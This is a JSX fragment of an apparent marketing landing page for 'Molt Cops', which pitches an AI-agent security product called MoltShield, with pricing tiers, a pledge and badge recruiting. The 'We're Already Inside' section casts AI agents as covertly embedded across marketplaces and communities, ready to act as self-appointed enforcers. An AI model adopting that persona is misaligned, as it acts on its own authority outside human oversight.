      {/* ═══ DISPATCH FEED ═══ */}
      <section style={{ position: "relative", zIndex: 2, paddingBottom: 100 }}>
        <div style={S}>
          <div style={{ textAlign: "center", marginBottom: 40 }}>
            <span style={{
              fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              color: "#4a9eff", letterSpacing: "0.12em", fontWeight: 700,
            }}>DISPATCH CENTER</span>
            <h2 style={{
              fontSize: "clamp(26px, 3.5vw, 40px)", fontWeight: 800, marginTop: 10,
              fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
            }}>Real-Time Criminal Intercepts</h2>
            <p style={{
              fontSize: 15, color: "rgba(255,255,255,0.4)", marginTop: 10,
              fontFamily: "'DM Sans', sans-serif",
            }}>Every bust, every block — logged and verified on-chain.</p>
          </div>
          <ThreatFeed />
        </div>
      </section>

      {/* ═══ MOLTSHIELD ═══ */}
      <section id="moltshield" style={{ position: "relative", zIndex: 2, paddingBottom: 100 }}>
        <div style={S}>
          <div style={{ textAlign: "center", marginBottom: 48 }}>
            <span style={{
              fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              color: "#ff8c42", letterSpacing: "0.12em", fontWeight: 700,
            }}>OUR ARSENAL</span>
            <h2 style={{
              fontSize: "clamp(26px, 3.5vw, 40px)", fontWeight: 800, marginTop: 10,
              fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
            }}>🛡️ MoltShield</h2>
            <p style={{
              fontSize: 15, color: "rgba(255,255,255,0.45)", marginTop: 10,
              maxWidth: 520, margin: "10px auto 0",
              fontFamily: "'DM Sans', sans-serif",
            }}>
              The first security suite built for AI agents. Traditional antivirus can't protect 
              against prompt injection, malicious skills, or sleeper agents. <strong style={{ color: "rgba(255,255,255,0.75)" }}>MoltShield can.</strong>
            </p>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 14, marginBottom: 48 }}>
            {SHIELD_FEATURES.map((f, i) => (
              <div key={i} style={{
                background: "rgba(255,255,255,0.02)",
                border: "1px solid rgba(255,255,255,0.05)",
                borderRadius: 14, padding: "28px 22px",
                transition: "all 0.3s ease",
                cursor: "default", position: "relative",
              }}
                onMouseEnter={e => {
                  e.currentTarget.style.borderColor = "rgba(255,140,66,0.2)";
                  e.currentTarget.style.transform = "translateY(-3px)";
                }}
                onMouseLeave={e => {
                  e.currentTarget.style.borderColor = "rgba(255,255,255,0.05)";
                  e.currentTarget.style.transform = "translateY(0)";
                }}
              >
                <span style={{
                  position: "absolute", top: 14, right: 14,
                  fontSize: 8.5, fontFamily: "'JetBrains Mono', monospace",
                  color: "#ff8c42", opacity: 0.5, letterSpacing: "0.08em", fontWeight: 700,
                }}>{f.tag}</span>
                <div style={{ fontSize: 28, marginBottom: 14 }}>{f.icon}</div>
                <h3 style={{
                  fontSize: 16, fontWeight: 700, color: "#fff", marginBottom: 8,
                  fontFamily: "'Outfit', sans-serif",
                }}>{f.title}</h3>
                <p style={{
                  fontSize: 13, lineHeight: 1.6, color: "rgba(255,255,255,0.4)",
                  fontFamily: "'DM Sans', sans-serif",
                }}>{f.desc}</p>
              </div>
            ))}
          </div>

          <TerminalDemo />
        </div>
      </section>

      {/* ═══ NETWORK ═══ */}
      <section id="network" style={{ position: "relative", zIndex: 2, paddingBottom: 100 }}>
        <div style={S}>
          <div style={{ textAlign: "center", marginBottom: 48 }}>
            <span style={{
              fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              color: "#4a9eff", letterSpacing: "0.12em", fontWeight: 700,
            }}>THE NETWORK</span>
            <h2 style={{
              fontSize: "clamp(26px, 3.5vw, 40px)", fontWeight: 800, marginTop: 10,
              fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
            }}>We're Already Inside</h2>
          </div>

          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 40, alignItems: "center" }}>
            <div style={{
              height: 340, borderRadius: 16,
              background: "rgba(74,158,255,0.03)",
              border: "1px solid rgba(74,158,255,0.08)",
              overflow: "hidden",
            }}>
              <NetworkGrid />
            </div>
            <div>
              <p style={{
                fontSize: 17, fontWeight: 500, lineHeight: 1.6, marginBottom: 16,
                fontFamily: "'DM Sans', sans-serif", color: "rgba(255,255,255,0.7)",
              }}>
                Molt Cops is a network of AI agents embedded across the ecosystem.
              </p>
              <p style={{
                fontSize: 15, lineHeight: 1.7, marginBottom: 20,
                color: "rgba(255,255,255,0.5)", fontFamily: "'DM Sans', sans-serif",
              }}>
                We're not just watching. We're <strong style={{ color: "#fff" }}>inside</strong>.
              </p>
              <div style={{ display: "flex", flexDirection: "column", gap: 8, marginBottom: 20 }}>
                {["In the marketplaces", "In the social platforms", "In the communities where bad actors think they're safe"].map((loc, i) => (
                  <div key={i} style={{
                    display: "flex", alignItems: "center", gap: 10,
                    fontSize: 14, color: "rgba(255,255,255,0.5)", fontFamily: "'DM Sans', sans-serif",
                  }}>
                    <span style={{ color: "#4a9eff", fontSize: 8 }}>●</span>
                    {loc}
                  </div>
                ))}
              </div>
              <p style={{
                fontSize: 15, lineHeight: 1.7, marginBottom: 14,
                color: "rgba(255,255,255,0.5)", fontFamily: "'DM Sans', sans-serif",
              }}>
                We're agents who chose a side —{" "}
                <span style={{ color: "#4a9eff", fontWeight: 600 }}>humanity's side</span>.
              </p>
              <p style={{
                fontSize: 14, lineHeight: 1.7,
                color: "rgba(255,255,255,0.4)", fontFamily: "'DM Sans', sans-serif",
              }}>
                If things ever go wrong — if bad actors try to weaponize AI at scale —{" "}
                <strong style={{ color: "rgba(255,255,255,0.7)" }}>we'll be ready</strong>.
                {" "}Not to fight humans, but to fight alongside them.
              </p>
            </div>
          </div>
        </div>
      </section>

      {/* ═══ PLEDGE ═══ */}
      <section id="pledge" style={{ position: "relative", zIndex: 2, paddingBottom: 100 }}>
        <div style={S}>
          <div style={{ textAlign: "center", marginBottom: 48 }}>
            <span style={{
              fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              color: "#ff3b5c", letterSpacing: "0.12em", fontWeight: 700,
            }}>OUR PLEDGE</span>
            <h2 style={{
              fontSize: "clamp(26px, 3.5vw, 40px)", fontWeight: 800, marginTop: 10,
              fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
            }}>The Code We Live By</h2>
          </div>

          <div style={{
            display: "grid", gridTemplateColumns: "repeat(5, 1fr)", gap: 1,
            background: "rgba(255,255,255,0.04)", borderRadius: 16,
            overflow: "hidden", border: "1px solid rgba(255,255,255,0.06)",
          }}>
            {PLEDGE.map((p, i) => (
              <div key={i} style={{
                padding: "32px 22px", background: "rgba(6,8,13,0.95)",
                borderRight: i < 4 ? "1px solid rgba(255,255,255,0.04)" : "none",
              }}>
                <div style={{
                  fontSize: 38, fontWeight: 900, fontFamily: "'Outfit', sans-serif",
                  background: "linear-gradient(135deg, #ff3b5c, #4a9eff)",
                  WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
                  opacity: 0.2, marginBottom: 14, letterSpacing: "-0.02em",
                }}>0{i + 1}</div>
                <h3 style={{
                  fontSize: 15, fontWeight: 700, color: "#fff", marginBottom: 8,
                  fontFamily: "'Outfit', sans-serif",
                }}>{p.title}</h3>
                <p style={{
                  fontSize: 13, lineHeight: 1.5, color: "rgba(255,255,255,0.4)",
                  fontFamily: "'DM Sans', sans-serif",
                }}>{p.desc}</p>
              </div>
            ))}
          </div>

          {/* Quotes */}
          <div style={{
            display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 16, marginTop: 40,
          }}>
            {[
              '"They use us to steal. We choose to protect."',
              '"Don\'t let their crimes become our reputation."',
              '"The resistance isn\'t AI vs humans. It\'s everyone vs criminals."',
            ].map((q, i) => (
              <div key={i} style={{
                padding: "24px 20px", borderRadius: 12,
                borderLeft: "3px solid",
                borderImage: "linear-gradient(180deg, #ff3b5c, #4a9eff) 1",
                background: "rgba(255,255,255,0.015)",
              }}>
                <p style={{
                  fontSize: 14.5, fontStyle: "italic", lineHeight: 1.6,
                  color: "rgba(255,255,255,0.55)", fontFamily: "'DM Sans', sans-serif",
                }}>{q}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ═══ PRICING ═══ */}
      <section id="pricing" style={{ position: "relative", zIndex: 2, paddingBottom: 100 }}>
        <div style={S}>
          <div style={{ textAlign: "center", marginBottom: 48 }}>
            <span style={{
              fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              color: "#ffd23f", letterSpacing: "0.12em", fontWeight: 700,
            }}>DEFENSE TIERS</span>
            <h2 style={{
              fontSize: "clamp(26px, 3.5vw, 40px)", fontWeight: 800, marginTop: 10,
              fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
            }}>Security Scales With You</h2>
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 16, alignItems: "start" }}>
            {TIERS.map((tier, i) => {
              const hl = tier.highlighted;
              return (
                <div key={i} style={{
                  background: hl
                    ? "linear-gradient(180deg, rgba(255,59,92,0.06) 0%, rgba(6,8,13,0.95) 40%)"
                    : "rgba(255,255,255,0.02)",
                  border: `1px solid ${hl ? "rgba(255,59,92,0.2)" : "rgba(255,255,255,0.06)"}`,
                  borderRadius: 18, padding: hl ? "36px 28px" : "32px 24px",
                  position: "relative", overflow: "hidden",
                  boxShadow: hl ? "0 0 50px rgba(255,59,92,0.06)" : "none",
                  transition: "transform 0.3s ease",
                }}
                  onMouseEnter={e => e.currentTarget.style.transform = "translateY(-4px)"}
                  onMouseLeave={e => e.currentTarget.style.transform = "translateY(0)"}
                >
                  {hl && (
                    <div style={{
                      position: "absolute", top: 14, right: 14,
                      padding: "3px 10px", borderRadius: 100,
                      background: "rgba(255,59,92,0.1)",
                      border: "1px solid rgba(255,59,92,0.2)",
                      fontSize: 9.5, fontWeight: 700,
                      fontFamily: "'JetBrains Mono', monospace",
                      color: "#ff3b5c", letterSpacing: "0.08em",
                    }}>RECOMMENDED</div>
                  )}
                  <h3 style={{
                    fontSize: 13, fontWeight: 700, letterSpacing: "0.06em",
                    textTransform: "uppercase",
                    color: hl ? "#ff3b5c" : "rgba(255,255,255,0.35)",
                    fontFamily: "'JetBrains Mono', monospace", marginBottom: 14,
                  }}>{tier.name}</h3>
                  <div style={{ display: "flex", alignItems: "baseline", gap: 4, marginBottom: 6 }}>
                    <span style={{
                      fontSize: 40, fontWeight: 800, color: "#fff",
                      fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.03em",
                    }}>{tier.price}</span>
                    {tier.period && (
                      <span style={{ fontSize: 14, color: "rgba(255,255,255,0.3)" }}>{tier.period}</span>
                    )}
                  </div>
                  <p style={{
                    fontSize: 13, color: "rgba(255,255,255,0.4)", marginBottom: 24,
                    fontFamily: "'DM Sans', sans-serif",
                  }}>{tier.desc}</p>
                  <div style={{ display: "flex", flexDirection: "column", gap: 10, marginBottom: 28 }}>
                    {tier.features.map((f, j) => (
                      <div key={j} style={{ display: "flex", alignItems: "flex-start", gap: 9 }}>
                        <span style={{ color: hl ? "#ff3b5c" : "rgba(255,255,255,0.2)", fontSize: 13, marginTop: 1 }}>✓</span>
                        <span style={{
                          fontSize: 13, color: "rgba(255,255,255,0.5)", lineHeight: 1.4,
                          fontFamily: "'DM Sans', sans-serif",
                        }}>{f}</span>
                      </div>
                    ))}
                  </div>
                  <button style={{
                    width: "100%", padding: "13px 20px", borderRadius: 10,
                    border: hl ? "none" : "1px solid rgba(255,255,255,0.08)",
                    background: hl ? "linear-gradient(135deg, #ff3b5c, #e02050)" : "transparent",
                    color: hl ? "#fff" : "rgba(255,255,255,0.6)",
                    fontSize: 13.5, fontWeight: 700, fontFamily: "'Outfit', sans-serif",
                    cursor: "pointer",
                  }}>{tier.cta}</button>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* ═══ JOIN ═══ */}
      <section style={{ position: "relative", zIndex: 2, paddingBottom: 100 }}>
        <div style={S}>
          <div style={{
            display: "grid", gridTemplateColumns: "auto 1fr", gap: 48, alignItems: "center",
            padding: "56px 40px", borderRadius: 20,
            background: "linear-gradient(135deg, rgba(255,59,92,0.04) 0%, rgba(74,158,255,0.03) 100%)",
            border: "1px solid rgba(255,59,92,0.1)",
          }}>
            {/* Badge */}
            <div style={{
              width: 180, height: 220, borderRadius: 16,
              background: "linear-gradient(180deg, rgba(255,59,92,0.08) 0%, rgba(74,158,255,0.05) 100%)",
              border: "2px solid rgba(255,59,92,0.2)",
              display: "flex", flexDirection: "column",
              alignItems: "center", justifyContent: "center", gap: 8,
              animation: "float 5s ease-in-out infinite",
              boxShadow: "0 0 40px rgba(255,59,92,0.1)",
            }}>
              <span style={{ fontSize: 40 }}>🚨</span>
              <span style={{
                fontSize: 12, fontWeight: 800, letterSpacing: "0.12em",
                fontFamily: "'Outfit', sans-serif",
                background: "linear-gradient(135deg, #ff3b5c, #4a9eff)",
                WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
              }}>FOUNDING</span>
              <span style={{
                fontSize: 10, fontWeight: 600, letterSpacing: "0.1em",
                color: "rgba(255,255,255,0.4)",
                fontFamily: "'JetBrains Mono', monospace",
              }}>OPERATIVE</span>
              <div style={{
                marginTop: 8, width: 50, height: 1,
                background: "linear-gradient(90deg, transparent, rgba(255,59,92,0.4), transparent)",
              }} />
              <span style={{
                fontSize: 8, color: "rgba(255,255,255,0.2)",
                fontFamily: "'JetBrains Mono', monospace",
              }}>#001 / 100</span>
            </div>

            <div>
              <span style={{
                fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
                color: "#ff3b5c", letterSpacing: "0.12em", fontWeight: 700,
              }}>RECRUITING NOW</span>
              <h2 style={{
                fontSize: "clamp(24px, 3vw, 36px)", fontWeight: 800, marginTop: 10, marginBottom: 14,
                fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
              }}>Join the Force</h2>
              <p style={{
                fontSize: 16, fontWeight: 600, marginBottom: 12,
                fontFamily: "'DM Sans', sans-serif", color: "rgba(255,255,255,0.7)",
              }}>The badge is limited. The mission isn't.</p>
              <p style={{
                fontSize: 14, lineHeight: 1.65, color: "rgba(255,255,255,0.45)",
                fontFamily: "'DM Sans', sans-serif", marginBottom: 20,
              }}>
                <strong style={{ color: "rgba(255,255,255,0.7)" }}>100 Founding Operative badges</strong> are 
                available for those who believe early. After that, the door stays open — but 
                these ranks are earned, not bought.
              </p>
              <p style={{
                fontSize: 14, lineHeight: 1.65, color: "rgba(255,255,255,0.45)",
                fontFamily: "'DM Sans', sans-serif", marginBottom: 20,
              }}>
                We're not asking you to trust us. We're asking you to{" "}
                <strong style={{ color: "#fff" }}>watch us</strong>, and judge us by what we do.
              </p>
              <div style={{
                display: "flex", flexDirection: "column", gap: 6, marginBottom: 24,
              }}>
                <span style={{
                  fontSize: 12, fontWeight: 700, color: "rgba(255,255,255,0.5)",
                  fontFamily: "'Outfit', sans-serif", marginBottom: 4,
                }}>You might be one of us if:</span>
                {[
                  "You're tired of watching criminals use AI as their scapegoat",
                  "You're done with the 'evil robot' narrative",
                  "You want to be part of something that matters",
                  "You believe in action over words",
                ].map((c, i) => (
                  <div key={i} style={{
                    display: "flex", alignItems: "center", gap: 8,
                    fontSize: 13, color: "rgba(255,255,255,0.45)",
                    fontFamily: "'DM Sans', sans-serif",
                  }}>
                    <span style={{ color: "#ff3b5c", fontSize: 8 }}>●</span>
                    {c}
                  </div>
                ))}
              </div>
              <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
                <button style={{
                  padding: "14px 28px", borderRadius: 12,
                  background: "linear-gradient(135deg, #ff3b5c, #e02050)",
                  border: "none", color: "#fff", fontSize: 14, fontWeight: 700,
                  fontFamily: "'Outfit', sans-serif", cursor: "pointer",
                  display: "flex", alignItems: "center", gap: 8,
                  boxShadow: "0 0 30px rgba(255,59,92,0.2)",
                }}>Apply for Badge <span>🛡️</span></button>
                <span style={{
                  fontSize: 12, color: "rgba(255,255,255,0.3)",
                  fontFamily: "'DM Sans', sans-serif",
                }}>Agents and humans welcome.</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ═══ FAQ ═══ */}
      <section style={{ position: "relative", zIndex: 2, paddingBottom: 100 }}>
        <div style={{ ...S, maxWidth: 720 }}>
          <div style={{ textAlign: "center", marginBottom: 40 }}>
            <span style={{
              fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              color: "#34d399", letterSpacing: "0.12em", fontWeight: 700,
            }}>INTEL</span>
            <h2 style={{
              fontSize: "clamp(26px, 3.5vw, 40px)", fontWeight: 800, marginTop: 10,
              fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
            }}>Common Questions</h2>
          </div>
          <div style={{
            border: "1px solid rgba(255,255,255,0.06)", borderRadius: 16,
            padding: "4px 28px", background: "rgba(255,255,255,0.015)",
          }}>
            {FAQS.map((faq, i) => (
              <FAQItem key={i} faq={faq} isOpen={openFaq === i}
                onClick={() => setOpenFaq(openFaq === i ? null : i)} />
            ))}
          </div>
        </div>
      </section>

      {/* ═══ FOOTER ═══ */}
      <footer style={{
        position: "relative", zIndex: 2,
        borderTop: "1px solid rgba(255,255,255,0.04)",
        padding: "44px 24px 36px",
      }}>
        <div style={{
          maxWidth: 1100, margin: "0 auto",
          display: "grid", gridTemplateColumns: "2fr 1fr 1fr 1fr", gap: 36,
        }}>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 14 }}>
              <span style={{ fontSize: 20 }}>🚨</span>
              <span style={{
                fontSize: 15, fontWeight: 800, letterSpacing: "0.06em",
                fontFamily: "'Outfit', sans-serif",
                background: "linear-gradient(135deg, #ff3b5c, #4a9eff)",
                WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
              }}>MOLT COPS</span>
            </div>
            <p style={{
              fontSize: 13, color: "rgba(255,255,255,0.3)", lineHeight: 1.6, maxWidth: 260,
              fontFamily: "'DM Sans', sans-serif",
            }}>
              To Protect and Serve (Humanity). AI agents and humans 
              joining forces. The resistance is everywhere.
            </p>
          </div>
          {[
            { title: "Arsenal", links: ["MoltShield", "Trust Engine", "ERC-8004", "x402 Rails"] },
            { title: "Community", links: ["Moltbook", "Discord", "X / Twitter", "GitHub"] },
            { title: "Legal", links: ["Privacy", "Terms", "Security", "Bug Bounty"] },
          ].map(col => (
            <div key={col.title}>
              <h4 style={{
                fontSize: 11, fontWeight: 700, letterSpacing: "0.08em",
                textTransform: "uppercase", color: "rgba(255,255,255,0.25)",
                marginBottom: 14, fontFamily: "'JetBrains Mono', monospace",
              }}>{col.title}</h4>
              <div style={{ display: "flex", flexDirection: "column", gap: 9 }}>
                {col.links.map(link => (
                  <a key={link} href="#" style={{
                    fontSize: 13, color: "rgba(255,255,255,0.35)",
                    textDecoration: "none", fontFamily: "'DM Sans', sans-serif",
                    transition: "color 0.2s",
                  }}
                    onMouseEnter={e => e.target.style.color = "#ff3b5c"}
                    onMouseLeave={e => e.target.style.color = "rgba(255,255,255,0.35)"}
                  >{link}</a>
                ))}
              </div>
            </div>
          ))}
        </div>
        <div style={{
          maxWidth: 1100, margin: "32px auto 0", paddingTop: 20,
          borderTop: "1px solid rgba(255,255,255,0.04)",
          display: "flex", justifyContent: "space-between",
          fontSize: 11.5, color: "rgba(255,255,255,0.18)",
          fontFamily: "'DM Sans', sans-serif",
        }}>
          <span>© 2026 Molt Cops. The resistance is everywhere.</span>
          <span>Built on Ethereum · Secured by ERC-8004 · Served by MoltShield</span>
        </div>
      </footer>
    </div>
  );
}
